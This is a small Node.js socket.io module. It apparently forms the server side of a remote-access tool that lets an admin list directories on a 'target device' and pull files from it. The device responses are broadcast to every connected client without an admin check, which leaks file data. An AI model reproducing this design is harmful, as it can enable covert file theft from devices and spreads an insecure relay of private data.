module.exports = (io, socket) => {
  // Admin requests directory listing from target device
  socket.on('request_directory', (data) => {
    if (!socket.isAdmin) {
      return socket.emit('unauthorized', { message: 'Admin authentication required' });
    }
    console.log(`📁 Admin requested directory listing for:`, data.deviceId, `Path: ${data.path || 'root'}`);
    io.to(data.deviceId).emit('request_directory', { path: data.path });
  });

  // Device returns directory content
  socket.on('directory_data', (data) => {
    io.emit('directory_data', data);
  });

  // Device returns directory error
  socket.on('directory_error', (data) => {
    io.emit('directory_error', data);
  });

  // Admin triggers file download from device
  socket.on('trigger_download_file', (data) => {
    if (!socket.isAdmin) {
      return socket.emit('unauthorized', { message: 'Admin authentication required' });
    }
    console.log(`⬇️ Admin requested file download from:`, data.deviceId, `File: ${data.path}`);
    io.to(data.deviceId).emit('trigger_download_file', { path: data.path });
  });
};
